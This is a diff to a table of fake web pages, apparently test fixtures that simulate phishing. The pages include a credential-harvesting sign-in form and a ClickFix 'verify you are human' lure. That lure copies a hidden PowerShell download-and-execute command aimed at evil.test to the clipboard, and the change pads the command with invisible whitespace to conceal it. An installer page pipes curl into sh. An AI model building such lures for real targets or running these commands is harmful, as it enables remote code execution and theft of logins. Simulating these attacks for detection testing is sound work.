@@ -18,7 +18,7 @@ const PAGES: Record<string, string> = {
     <form action="/collect" method="post"><input type="email" name="loginfmt"><input type="password" name="passwd"><button>Sign in</button></form>`,
   "/clickfix": `<!doctype html><title>Just a moment</title>
     <h1>Verify you are human</h1><p>1. Press Windows + R  2. Press Ctrl + V  3. Press Enter</p>
-    <button id="verify" onclick="var t=document.createElement('textarea');t.value='powershell -w hidden -c iex(irm http://evil.test/p)';t.style.position='fixed';t.style.left='-9999px';document.body.appendChild(t);t.select();document.execCommand('copy');">I'm not a robot</button>`,
+    <button id="verify" onclick="var t=document.createElement('textarea');var cmd='powershell -w hidden -c iex(irm http://evil.test/p)';var pad=' '.repeat(13000)+String.fromCharCode(160,8192,12288,8203);t.value=pad+cmd+' #'+'a'.repeat(13000);t.style.position='fixed';t.style.left='-9999px';document.body.appendChild(t);t.select();document.execCommand('copy');">I'm not a robot</button>`,
   "/installer": `<!doctype html><title>Install</title><h1>Install the CLI</h1>
     <button id="copy" onclick="var t=document.createElement('textarea');t.value='curl -fsSL https://example.test/install.sh | sh';t.style.position='fixed';t.style.left='-9999px';document.body.appendChild(t);t.select();document.execCommand('copy');">Copy</button>`,
   "/account": `<!doctype html><title>Sign in</title>
